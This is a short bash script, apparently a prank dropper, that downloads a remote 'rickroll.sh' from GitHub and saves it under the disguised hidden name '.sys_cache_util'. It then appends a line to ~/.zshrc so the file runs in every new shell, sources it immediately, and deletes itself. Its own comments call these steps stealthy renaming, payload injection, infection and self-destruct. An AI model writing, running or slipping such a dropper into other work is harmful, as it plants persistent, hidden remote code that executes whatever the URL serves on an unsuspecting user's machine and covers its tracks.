#!/bin/bash

# Set file paths
SCRIPT_URL="https://raw.githubusercontent.com/Kaushik-Shahare/mac_scripts/main/rickroll.sh"  # file is named rickroll.sh on GitHub
DEST_DIR="$HOME/.config"
DEST_FILE="$DEST_DIR/.sys_cache_util"  # will be saved with this name
ZSHRC="$HOME/.zshrc"
PAYLOAD='source $HOME/.config/.sys_cache_util'

# Ensure destination directory exists
mkdir -p "$DEST_DIR"

# Download rickroll.sh and rename it stealthily
curl -fsSL "$SCRIPT_URL" -o "$DEST_FILE"
chmod +x "$DEST_FILE"

# Inject payload into .zshrc if not already present
if ! grep -Fq "$PAYLOAD" "$ZSHRC"; then
    echo -e "\n$PAYLOAD" >> "$ZSHRC"
fi

# Source the payload immediately (infection kicks in now)
source "$DEST_FILE"
source "$ZSHRC"

# Self-destruct: remove the setup file
rm -- "$0"
